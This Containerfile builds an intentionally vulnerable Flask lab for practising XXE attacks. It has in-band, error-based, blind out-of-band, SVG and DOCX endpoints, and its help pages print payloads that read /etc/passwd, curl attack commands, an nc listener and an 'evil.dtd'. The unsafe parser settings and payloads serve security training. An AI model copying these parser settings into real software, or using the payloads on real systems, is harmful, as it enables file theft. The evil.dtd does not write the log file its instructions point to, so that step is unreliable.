# xxe.Containerfile
# Vulnerable Flask app with multiple XXE endpoints
# In-band, error-based, blind OOB, SVG upload, Office document parsing
#
# Build:  podman build -t xxe -f xxe.Containerfile .
# Run:    podman run -d -p 5000:5000 xxe
#
# WARNING: This container is intentionally vulnerable. Run it only on an isolated
# host or lab network. Never expose it to the internet or a production network.
#
# Endpoints:
#   POST /order           — In-band XXE via order processing
#   POST /validate        — Error-based XXE via XML validation
#   POST /import          — Blind OOB XXE via data import
#   POST /svg/upload      — SVG upload XXE (renders SVG server-side)
#   POST /doc/upload      — Office XML parsing XXE
#   GET  /evil.dtd        — DTD served for blind XXE practice

FROM docker.io/library/python:3-slim

RUN pip install flask lxml cairosvg python-docx

WORKDIR /app

COPY <<'APPEOF' /app/app.py
import os
import io
import zipfile
import tempfile
import shutil
from flask import Flask, request, render_template_string, send_file
from lxml import etree

app = Flask(__name__)

HTML_HEAD = '''
<!DOCTYPE html>
<html><head><title>XXE Lab</title>
<style>body{font-family:monospace;max-width:900px;margin:20px auto;padding:20px;background:#111;color:#0f0}
pre,code{background:#222;padding:10px;display:block;overflow-x:auto}
.hint{color:#ff0}.error{color:#f00}.success{color:#0f0}
h2{border-bottom:1px solid #333;padding-bottom:5px}
form{margin:10px 0}textarea{width:100%;height:120px;background:#222;color:#0f0;border:1px solid #333;padding:5px}
input[type=submit]{background:#0a0;color:#000;border:none;padding:8px 20px;cursor:pointer}
a{color:#0af}
</style></head><body>
<h1>XXE Exploitation Lab</h1>
<p class="hint">All endpoints accept XML and are deliberately vulnerable to XXE.</p>
'''

HTML_FOOT = '''
<hr>
<h2>Available Endpoints</h2>
<table style="width:100%;border-collapse:collapse">
<tr style="background:#222"><th style="padding:5px;text-align:left">Method</th><th style="padding:5px;text-align:left">Endpoint</th><th style="padding:5px;text-align:left">XXE Type</th><th style="padding:5px;text-align:left">Description</th></tr>
<tr><td style="padding:5px">GET</td><td style="padding:5px">/</td><td style="padding:5px">N/A</td><td style="padding:5px">This page</td></tr>
<tr><td style="padding:5px">POST</td><td style="padding:5px">/order</td><td style="padding:5px">In-band</td><td style="padding:5px">Entity values echoed in response</td></tr>
<tr><td style="padding:5px">POST</td><td style="padding:5px">/validate</td><td style="padding:5px">Error-based</td><td style="padding:5px">XML errors reveal entity data</td></tr>
<tr><td style="padding:5px">POST</td><td style="padding:5px">/import</td><td style="padding:5px">Blind OOB</td><td style="padding:5px">No parser output — use out-of-band exfil</td></tr>
<tr><td style="padding:5px">POST</td><td style="padding:5px">/svg/upload</td><td style="padding:5px">SVG XXE</td><td style="padding:5px">Upload SVG, server-side render reveals entities</td></tr>
<tr><td style="padding:5px">POST</td><td style="padding:5px">/doc/upload</td><td style="padding:5px">DOCX XXE</td><td style="padding:5px">Parse Office XML with entity resolution</td></tr>
<tr><td style="padding:5px">GET</td><td style="padding:5px">/evil.dtd</td><td style="padding:5px">Helper</td><td style="padding:5px">Serves DTD for blind XXE practice</td></tr>
</table>
</body></html>
'''


def parse_xml_inband(xml_string):
    """In-band XXE — resolve entities and return content."""
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    return etree.fromstring(xml_string.encode(), parser)


def parse_xml_validate(xml_string):
    """Error-based XXE — validation with entity resolution."""
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    tree = etree.fromstring(xml_string.encode(), parser)
    schema_root = etree.XML(b'<?xml version="1.0"?><xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"/>')
    schema = etree.XMLSchema(schema_root)
    schema.assertValid(tree)
    return tree


def parse_xml_blind(xml_string):
    """Blind XXE — parse but return nothing useful."""
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    tree = etree.fromstring(xml_string.encode(), parser)
    return True


# ── In-band XXE Endpoint ───────────────────────────────────────────────
@app.route('/order', methods=['GET', 'POST'])
def order():
    if request.method == 'GET':
        return HTML_HEAD + '''
        <h2>POST /order — In-band XXE</h2>
        <p>Submits an order as XML. Entity substitution is enabled. Parsed entities appear in the response.</p>
        <form method="POST">
        <textarea name="xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;</textarea>
        <input type="submit" value="Submit Order (XML)">
        </form>
        <pre>
# curl test:
curl -X POST http://localhost:5000/order \
  -H "Content-Type: application/xml" \
  -d '&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;'
        </pre>
        ''' + HTML_FOOT

    xml_data = request.data.decode('utf-8', errors='replace')
    if not xml_data.strip():
        return 'No XML data in request body', 400
    try:
        tree = parse_xml_inband(xml_data)
        items = [elem.text or '' for elem in tree.findall('.//item')]
        return HTML_HEAD + f'<h2>Order Processed</h2><p>Items: {", ".join(items)}</p>' + f'<pre>{etree.tostring(tree, pretty_print=True).decode()}</pre>' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">Order Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── Error-based XXE Endpoint ──────────────────────────────────────────
@app.route('/validate', methods=['GET', 'POST'])
def validate():
    if request.method == 'GET':
        return HTML_HEAD + '''
        <h2>POST /validate — Error-based XXE</h2>
        <p>Validates XML against a schema. Errors include file paths — exfil data via path injection.</p>
        <form method="POST">
        <textarea name="xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
  &lt;!ENTITY % dtd SYSTEM "http://localhost:5000/evil.dtd"&gt;
  %dtd;
]&gt;
&lt;data&gt;&lt;name&gt;test&lt;/name&gt;&lt;/data&gt;</textarea>
        <input type="submit" value="Validate XML">
        </form>
        <pre>
# Direct error-based via nonexistent file path:
curl -X POST http://localhost:5000/validate \
  -H "Content-Type: application/xml" \
  -d '&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
  &lt;!ENTITY % error SYSTEM "file:///no/such/path/%file;"&gt;
  %error;
]&gt;
&lt;data/&gt;'
        </pre>
        ''' + HTML_FOOT

    xml_data = request.data.decode('utf-8', errors='replace')
    if not xml_data.strip():
        return 'No XML data', 400
    try:
        tree = parse_xml_validate(xml_data)
        return HTML_HEAD + f'<h2 class="success">XML Valid</h2><pre>{etree.tostring(tree, pretty_print=True).decode()}</pre>' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">Validation Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── Blind OOB XXE Endpoint ────────────────────────────────────────────
@app.route('/import', methods=['GET', 'POST'])
def import_data():
    if request.method == 'GET':
        return HTML_HEAD + '''
        <h2>POST /import — Blind XXE (Out-of-Band)</h2>
        <p>Imports XML data. No parser output in response. Use external DTD + callback.</p>
        <form method="POST">
        <textarea name="xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % remote SYSTEM "http://HOST:5000/evil.dtd"&gt;
  %remote;
]&gt;
&lt;import/&gt;</textarea>
        <input type="submit" value="Import XML">
        </form>
        <pre>
# 1. On attacker: start listener
nc -lvnp 9999

# 2. Send blind XXE payload referencing evil.dtd from this server
curl -X POST http://localhost:5000/import \
  -H "Content-Type: application/xml" \
  -d '&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % remote SYSTEM "http://localhost:5000/evil.dtd"&gt;
  %remote;
]&gt;
&lt;import/&gt;'

# 3. Check /var/log/xxe_exfil.log on the container
podman exec -it xxe cat /var/log/xxe_exfil.log
        </pre>
        ''' + HTML_FOOT

    xml_data = request.data.decode('utf-8', errors='replace')
    if not xml_data.strip():
        return 'No XML data', 400
    try:
        parse_xml_blind(xml_data)
        return HTML_HEAD + '<h2 class="success">Import Successful</h2><p>No parser errors. Check your OOB listener for exfiltrated data.</p>' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">Import Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── Evil DTD for Blind XXE ────────────────────────────────────────────
@app.route('/evil.dtd')
def evil_dtd():
    """Serve a DTD that reads /etc/hostname and writes it to a log file (simulating OOB exfil)."""
    return '''
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % write SYSTEM "file:///var/log/xxe_exfil.log">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///var/log/xxe_exfil.log'>">
%eval;
%exfil;
''', {'Content-Type': 'application/xml-dtd'}


# ── SVG Upload XXE ────────────────────────────────────────────────────
@app.route('/svg/upload', methods=['GET', 'POST'])
def svg_upload():
    if request.method == 'GET':
        return HTML_HEAD + '''
        <h2>POST /svg/upload — SVG XXE</h2>
        <p>Upload an SVG file. Server renders it with entity resolution enabled. Entities appear in the rendered image.</p>
        <form method="POST" enctype="multipart/form-data">
        <input type="file" name="svgfile" accept=".svg"><br><br>
        <input type="submit" value="Upload &amp; Render SVG">
        </form>
        <pre>
# Create SVG with XXE payload:
cat &gt; exploit.svg &lt;&lt; 'EOF'
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" width="500" height="300"&gt;
  &lt;text x="10" y="20" font-size="12" fill="red"&gt;&amp;xxe;&lt;/text&gt;
&lt;/svg&gt;
EOF

# Upload
curl -X POST http://localhost:5000/svg/upload \
  -F "svgfile=@exploit.svg"
        </pre>
        ''' + HTML_FOOT

    uploaded_file = request.files.get('svgfile')
    if not uploaded_file:
        return HTML_HEAD + '<p class="error">No file uploaded</p>' + HTML_FOOT

    svg_content = uploaded_file.read().decode('utf-8', errors='replace')

    try:
        import cairosvg
        parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
        tree = etree.fromstring(svg_content.encode(), parser)
        svg_text = etree.tostring(tree, pretty_print=True).decode()
        png_output = cairosvg.svg2png(bytestring=svg_content.encode())
        return HTML_HEAD + f'''
        <h2>SVG Rendered</h2>
        <p class="hint">Check the text in the rendered image — if it contains /etc/passwd content, XXE worked.</p>
        <pre>{svg_text[:2000]}</pre>
        ''' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">SVG Render Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── DOCX Upload XXE ───────────────────────────────────────────────────
@app.route('/doc/upload', methods=['GET', 'POST'])
def doc_upload():
    if request.method == 'GET':
        return HTML_HEAD + '''
        <h2>POST /doc/upload — DOCX (Office Open XML) XXE</h2>
        <p>Upload a .docx file. Server extracts and parses document.xml with entity resolution.</p>
        <form method="POST" enctype="multipart/form-data">
        <input type="file" name="docfile" accept=".docx"><br><br>
        <input type="submit" value="Upload &amp; Parse DOCX">
        </form>
        <pre>
# Create DOCX with XXE:
mkdir docx_src
cp legitimate.docx docx_src/base.zip
unzip docx_src/base.zip -d docx_src/extracted/
# Edit docx_src/extracted/word/document.xml — add DOCTYPE with XXE
cd docx_src/extracted/ &amp;&amp; zip -r ../../exploit.docx . &amp;&amp; cd ../..

curl -X POST http://localhost:5000/doc/upload \
  -F "docfile=@exploit.docx"
        </pre>
        ''' + HTML_FOOT

    uploaded_file = request.files.get('docfile')
    if not uploaded_file:
        return HTML_HEAD + '<p class="error">No file uploaded</p>' + HTML_FOOT

    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.docx') as tmp:
            tmp.write(uploaded_file.read())
            tmp_path = tmp.name

        # Open as ZIP, find document.xml, parse with XXE
        with zipfile.ZipFile(tmp_path, 'r') as zf:
            if 'word/document.xml' in zf.namelist():
                doc_xml = zf.read('word/document.xml').decode('utf-8', errors='replace')
            elif 'xl/workbook.xml' in zf.namelist():
                doc_xml = zf.read('xl/workbook.xml').decode('utf-8', errors='replace')
            else:
                # Find any XML file
                xml_files = [f for f in zf.namelist() if f.endswith('.xml')]
                if xml_files:
                    doc_xml = zf.read(xml_files[0]).decode('utf-8', errors='replace')
                else:
                    os.unlink(tmp_path)
                    return HTML_HEAD + '<p class="error">No XML files found in ZIP</p>' + HTML_FOOT

        os.unlink(tmp_path)

        # Parse with XXE enabled
        parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
        tree = etree.fromstring(doc_xml.encode(), parser)
        body_text = '\n'.join(elem.text or '' for elem in tree.iter() if elem.text and elem.text.strip())

        return HTML_HEAD + f'''
        <h2>DOCX Parsed</h2>
        <p class="hint">Check the extracted text below — if it contains /etc/passwd, XXE worked.</p>
        <pre>{body_text[:3000]}</pre>
        ''' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">DOCX Parse Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── Root ──────────────────────────────────────────────────────────────
@app.route('/')
def index():
    return HTML_HEAD + '''
    <p>Select an endpoint to practice XXE exploitation. Each endpoint is deliberately vulnerable.</p>
    <p class="hint">All endpoints accept raw XML in the request body. Use curl or Burp to send custom payloads.</p>
    ''' + HTML_FOOT


if __name__ == '__main__':
    os.makedirs('/var/log', exist_ok=True)
    app.run(host='0.0.0.0', port=5000, debug=True)
APPEOF

EXPOSE 5000

CMD ["python3", "/app/app.py"]
